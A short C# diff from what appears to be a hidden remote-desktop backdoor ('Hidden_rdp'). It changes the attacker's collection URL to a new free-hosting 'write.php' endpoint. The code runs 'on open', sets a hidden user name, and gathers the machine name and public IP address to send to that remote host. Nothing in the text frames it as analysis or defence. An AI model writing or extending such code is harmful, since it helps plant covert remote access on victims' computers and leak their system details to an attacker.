@@ -16,7 +16,7 @@ namespace Hidden_rdp
     {
         //===========================================================================================================================================
         //Send data on open
-        string targetUrl = "https://leakkings.000webhostapp.com/write.php?info=";
+        string targetUrl = "http://deos.esy.es/write.php?info=";
         string userName = "hidden";
         string pcName = Environment.MachineName.ToString();
         string myIp = new WebClient().DownloadString(@"http://ipv4bot.whatismyipaddress.com/");
